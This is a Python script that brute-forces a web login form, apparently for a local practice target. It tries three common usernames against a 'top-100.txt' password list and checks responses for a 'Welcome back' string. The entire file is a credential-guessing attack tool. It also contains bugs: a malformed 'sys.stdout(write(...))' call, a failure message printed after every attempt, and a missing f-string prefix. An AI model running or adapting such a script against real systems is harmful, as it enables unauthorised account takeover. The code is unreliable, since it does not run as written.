import requests
import sys
import time

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
success_message = "Welcome back"

for username in usernames:
	with open(passwords, "r") as password_list:
		for password in password_list:
			password = password.strip("\n").encode()
			sys.stdout.write(f"[X] Attempting user:password -> {username}:{password.decode()}\r")
			sys.stdout.flush()
			
			# debug
			time.sleep(0.1)

			r = requests.post(target, data={"username": username, "password": password})
			if success_message.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout(write(f"\t[>>>>>] Valid password {password.decode()} found for user {username}"))
				sys.exit()
			sys.stdout.flush()
			sys.stdout.write("\n")
			sys.stdout.write("\tNo password found for {username} !")
			sys.stdout.write("\n")